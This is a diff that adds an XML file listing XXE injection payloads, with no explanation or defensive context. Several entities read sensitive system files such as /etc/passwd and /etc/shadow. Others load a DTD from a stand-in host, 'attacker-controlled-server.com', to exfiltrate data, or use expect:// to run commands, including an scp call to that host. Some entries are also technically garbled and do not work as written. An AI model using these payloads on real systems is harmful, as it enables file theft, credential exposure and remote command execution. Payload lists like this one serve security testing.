@@ -1,0 +1,80 @@
+<payloads>
+    <payload>
+        <!DOCTYPE foo [
+        <!ELEMENT foo ANY >
+        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+        <foo>&xxe;</foo>
+    </payload>
+    <payload>
+        <!DOCTYPE foo [
+        <!ELEMENT foo ANY >
+        <!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
+        <foo>&xxe;</foo>
+    </payload>
+    <payload>
+        <!DOCTYPE foo [
+        <!ELEMENT foo ANY >
+        <!ENTITY xxe SYSTEM "file:///etc/hosts" >]>
+        <foo>&xxe;</foo>
+    </payload>
+    <payload>
+        <!DOCTYPE foo [
+        <!ELEMENT foo ANY >
+        <!ENTITY xxe SYSTEM "file:///etc/services" >]>
+        <foo>&xxe;</foo>
+    </payload>
+    <payload>
+        <!DOCTYPE foo [
+        <!ELEMENT foo ANY >
+        <!ENTITY xxe SYSTEM "file:///etc/ssh/ssh_config" >]>
+        <foo>&xxe;</foo>
+    </payload>
+    <payload>
+        <!DOCTYPE foo [
+        <!ELEMENT foo ANY >
+        <!ENTITY % file SYSTEM "file:///etc/passwd">
+        <!ENTITY % dtd SYSTEM "http://attacker-controlled-server.com/xxe-dtd.dtd">
+        %dtd;]>
+        <foo>
+            <user>
+                &file;
+            </user>
+        </foo>
+    </payload>
+    <payload>
+        <!DOCTYPE foo [
+        <!ELEMENT foo ANY >
+        <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=expect://ls">
+        <!ENTITY % dtd SYSTEM "http://attacker-controlled-server.com/xxe-dtd.dtd">
+        %dtd;]>
+        <foo>
+            <command>
+                &data;
+            </command>
+        </foo>
+    </payload>
+    <payload>
+        <!DOCTYPE foo [
+        <!ELEMENT foo ANY >
+        <!ENTITY % data SYSTEM "expect://spawn scp attacker@attacker-controlled-server.com:/path/to/file.txt">
+        <!ENTITY % dtd SYSTEM "http://attacker-controlled-server.com/xxe-dtd.dtd">
+        %dtd;]>
+        <foo>
+            <command>
+                &data;
+            </command>
+        </foo>
+    </payload>
+    <payload>
+        <!DOCTYPE foo [
+        <!ELEMENT foo ANY >
+        <!ENTITY % data SYSTEM "data://text/plain;base64,file:///etc/passwd">
+        <!ENTITY % dtd SYSTEM "http://attacker-controlled-server.com/xxe-dtd.dtd">
+        %dtd;]>
+        <foo>
+            <file>
+                &data;
+            </file>
+        </foo>
+    </payload>
+</payloads>
